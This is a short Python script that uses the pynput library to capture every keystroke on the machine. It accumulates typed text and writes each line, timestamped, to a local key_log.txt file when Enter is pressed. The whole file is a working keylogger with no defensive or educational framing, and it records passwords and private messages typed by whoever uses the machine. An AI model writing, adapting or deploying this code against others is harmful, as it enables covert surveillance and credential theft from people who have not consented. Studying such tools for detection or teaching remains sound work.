from pynput.keyboard import Key, Listener
import logging

# Log file
log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG,
                    format='%(asctime)s: %(message)s')  # Changed the format

logged_string = ""  # Initialize an empty string to store the typed string

def on_press(key):
    global logged_string  # Declare the use of the global variable

    if key == Key.enter:  # Check if Enter key is pressed
        if logged_string:  # Check if there's a logged string
            logging.info(logged_string)  # Log the accumulated string
            logged_string = ""  # Clear the accumulated string
    else:
        try:
            logged_string += key.char  # Append the pressed key to the accumulated string
        except AttributeError:
            logged_string += " " + str(key) + " "  # Handle non-character keys

with Listener(on_press=on_press) as listener:
    listener.join()
